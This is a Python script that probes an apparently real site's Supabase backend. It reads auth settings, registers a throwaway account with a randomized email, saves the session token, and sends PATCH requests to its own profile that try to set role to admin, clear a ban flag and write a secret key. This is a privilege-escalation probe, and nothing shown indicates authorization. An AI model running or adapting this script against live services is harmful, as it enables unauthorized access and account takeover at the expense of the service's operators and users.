import ssl, json, urllib.request, urllib.error, time, random, string

BASE = "https://cdn.onlyfakeai.ru"
KEY = "<publishable-key>"
ctx = ssl.create_default_context()

def req(method, path, body=None, token=None, extra=None):
    h = {
        "User-Agent": "Mozilla/5.0",
        "apikey": KEY,
        "Authorization": f"Bearer {token or KEY}",
        "X-Client-Info": "supabase-js/2.49.4",
        "Prefer": "return=representation",
        "Content-Type": "application/json;charset=UTF-8",
    }
    if extra:
        h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=25, context=ctx) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, str(e)

st, txt = req("GET", "/auth/v1/settings")
print("=== auth settings ===")
print(txt[:2000])

# throwaway account
suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
email = f"rat4080probe{suffix}@gmail.com"
password = "Xr9!kQ2#mZ7$pLw1"
print(f"\n=== signup {email} ===")
st, txt = req("POST", "/auth/v1/signup", body={"email": email, "password": password})
print(st, txt[:800])
try:
    session = json.loads(txt)
    access = (session.get("access_token") or (session.get("session") or {}).get("access_token") or "")
    user_id = ((session.get("user") or {}).get("id") or "")
    print("user_id:", user_id)
    print("has token:", bool(access))
    if access:
        open("token.txt", "w").write(json.dumps(session))
        st2, txt2 = req("GET", "/auth/v1/user", token=access)
        print("whoami:", st2, txt2[:400])
        # inspect own profile row
        st3, txt3 = req("GET", f"/rest/v1/profiles?select=*&user_id=eq.{user_id}", token=access)
        print("own profile:", st3, txt3[:600])
        # try updating own profile fields: role, banned, secret_key, email
        for field, val in [("role", "admin"), ("banned", False), ("secret_key", "test-secret-probe")]:
            st4, txt4 = req("PATCH", f"/rest/v1/profiles?user_id=eq.{user_id}",
                            body={field: val}, token=access)
            print(f"PATCH {field}={val} ->", st4, txt4[:300])
        st5, txt5 = req("GET", f"/rest/v1/profiles?select=*&user_id=eq.{user_id}", token=access)
        print("after patch:", st5, txt5[:600])
except Exception as e:
    print("parse err", e)
